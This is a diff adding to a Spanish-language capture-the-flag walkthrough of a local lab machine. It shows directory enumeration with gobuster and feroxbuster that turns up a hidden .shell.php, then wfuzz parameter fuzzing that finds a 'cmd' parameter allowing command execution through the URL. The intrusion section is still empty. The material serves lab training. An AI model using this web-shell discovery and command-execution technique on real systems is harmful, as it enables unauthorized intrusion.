@@ -88,4 +88,77 @@ gobuster dir -u "http://172.17.0.2/" -w /usr/share/dirbuster/wordlists/directory
 - **-w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt**: Indica la ruta del archivo de wordlist, que contiene una lista de posibles nombres de directorios y archivos que se intentarán descubrir.
 - **-x txt,html,php**: Especifica las extensiones que se le añadirán a cada término de la wordlist para buscar archivos con esos formatos (por ejemplo, index.txt, index.html, index.php).
 
+```
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://172.17.0.2/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,txt,html
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 1380]
+/backup.txt           (Status: 200) [Size: 53]
+/hidden               (Status: 301) [Size: 309] [--> http://172.17.0.2/hidden/]
+/.html                (Status: 403) [Size: 275]
+/.php                 (Status: 403) [Size: 275]
+/server-status        (Status: 403) [Size: 275]
+Progress: 882184 / 882188 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+Veo un archibo backup.txt y una ruta /hidden, primero voy a ver el archivo.
+Abro la ruta:
+```bash
+http://172.17.0.2/backup.txt
+```
+en el buscador y puedo leero:
+```
+Error 403: Forbidden. Directory listing is disabled.
+```
+Nos vamos a centrar en el directorio hidden, primeramente lanzo un scaneo normal con gobuster y no encuentro nada,
+pero intuyendo que no hay otra cosa que rascar, lanzo un scan con otra herramienta
+```bash
+ feroxbuster -u "http://172.17.0.2" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php,html,txt,js,old,bak
+```
+y esta vez veo una ruta nueva:
+```
+200      GET        0l        0w        0c http://172.17.0.2/hidden/.shell.php
+```
+
+recordando el backup.txt que nos decía que no se pueden listar directorios, intento fuerzabruta al php pero con un comando por ejemplo "id"
+
+```bash
+ wfuzz -c --hc=404 --hh=0 -w /opt/SecLists/Discovery/Web-Content/big.txt  "http://172.17.0.2/hidden/.shell.php?FUZZ=id"
+```
+*Explicación:*
+ - **wfuzz**: Herramienta para realizar fuzzing en aplicaciones web, permitiendo probar múltiples entradas en parámetros de URLs.
+- **-c**: Muestra la salida en color, lo que facilita la identificación de resultados relevantes.
+- **--hc=404**: Excluye las respuestas que retornen el código HTTP 404 (Not Found), para filtrar resultados no deseados.
+- **--hh=0**: Oculta las respuestas cuyo tamaño (header) sea 0, eliminando resultados vacíos.
+- **-w /opt/SecLists/Discovery/Web-Content/big.txt**: Especifica la wordlist que se utilizará, en este caso, el archivo 'big.txt' ubicado en la ruta dada.
+- **"http://172.17.0.2/hidden/.shell.php?FUZZ=id"**: Es la URL objetivo donde se reemplazará la palabra clave `FUZZ` por cada entrada de la wordlist, permitiendo identificar posibles recursos o comportamientos en el parámetro `id`.
+
+```
+000004749:   200        1 L      3 W        54 Ch       "cmd"
+```
+ya podemos ejecutar desde la url comnandos
+
+
+## FASE INTRUSIÓN
+
+
+
+
+
+
 
